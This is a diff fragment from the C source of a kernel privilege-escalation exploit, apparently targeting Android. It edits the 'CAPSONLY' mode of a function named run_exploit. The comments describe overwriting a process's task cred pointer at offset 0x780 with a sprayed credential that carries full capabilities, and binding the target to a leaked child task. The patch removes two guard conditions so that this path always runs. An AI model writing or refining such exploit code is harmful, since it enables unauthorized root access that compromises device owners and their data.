@@ -3733,7 +3733,7 @@ int run_exploit(int argc, char **argv) {
         proof_val = 0;
         desc = "SLIDE_ZERO data-only";
       }
-    } else if (env_flag("MODE4_CAPSONLY", 0) && g_cred_copy) {
+    } else if (env_flag("MODE4_CAPSONLY", 0)) {
       /*
        * CAPSONLY (diyiqiuye PFEM10 recipe): write task->cred(+0x780) =
        * our spray-page caps-cred (uid=2000 + 5×full caps). The guard
@@ -3788,7 +3788,7 @@ int run_exploit(int argc, char **argv) {
     TIMER("pre-WRITE_PROOF drain");
     /* CAPSONLY: late-bind the target to the child's task+0x780 now that
      * the child exists (spawned below) — use the leaked child task */
-    if (env_flag("MODE4_CAPSONLY", 0) && !proof_tgt) {
+    if (env_flag("MODE4_CAPSONLY", 0)) {
       struct child_pipes cpipes;
       pid_t cap_child = spawn_child(&cpipes);
       if (cap_child > 0) {
